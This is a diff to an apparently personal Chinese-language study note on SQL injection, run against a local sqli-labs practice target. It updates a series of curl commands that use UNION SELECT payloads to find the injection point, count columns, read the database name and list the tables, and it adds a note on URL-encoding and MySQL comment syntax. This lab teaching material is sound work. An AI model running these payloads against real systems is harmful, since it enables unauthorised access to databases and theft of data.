@@ -106,27 +106,33 @@ $sql = "SELECT * FROM users WHERE id = '$id'";   // $id 直接来自 URL
 B="http://127.0.0.1:8083/Less-1/"
 
 # ① 判断注入点：加个单引号看报不报错
-curl "${B}?id=1'"
+curl -s -G "$B" --data-urlencode "id=1'"
 # → You have an error in your SQL syntax...  ⇒ 有注入
 
 # ② 判断列数：order by 逐步加，直到报错
-curl "${B}?id=1' order by 3--+"
+curl -s -G "$B" --data-urlencode "id=1' order by 3#"
 # → Your Login name:Dumb            ⇒ 3 列存在
-curl "${B}?id=1' order by 4--+"
+curl -s -G "$B" --data-urlencode "id=1' order by 4#"
 # → Unknown column '4' in 'order clause'   ⇒ 只有 3 列
 
 # ③ 找显示位：把 id 置为负数让原查询为空，union 的内容才会显示
-curl "${B}?id=-1' union select 1,2,3--+"
+curl -s -G "$B" --data-urlencode "id=-1' union select 1,2,3#"
 # → Your Login name:2 / Your Password:3   ⇒ 第 2、3 位会回显
 
 # ④ 取当前库名
-curl "${B}?id=-1' union select 1,2,database()--+"
+curl -s -G "$B" --data-urlencode "id=-1' union select 1,2,database()#"
 # → security
 
 # ⑤ 取该库所有表名
-curl "${B}?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+"
+curl -s -G "$B" --data-urlencode "id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#"
 # → emails,referers,uagents,users
 ```
+
+> ⚠️ **两条铁律**（不照做一定报 `curl: (3) URL rejected`）：
+> 1. **别把带空格/单引号的 payload 直接写进 URL** —— 空格和 `'` 在 URL 里是非法的。用 `-G` + `--data-urlencode` 让 curl 自动编码（你只管写真实的 `'` 和空格）。
+> 2. **SQL 注释用 `#`，别用 `--+`** —— `--data-urlencode` 会把 `+` 编成 `%2b`（真加号），而 MySQL 的 `--` 后面必须跟空格，`--+` 就不算注释了。
+>
+> 不想写这些参数也行：直接跑脚本 `bash ~/xx/CS/scripts/dvwa-sqli.sh`。
 
 **我的实测输出汇总**：
 
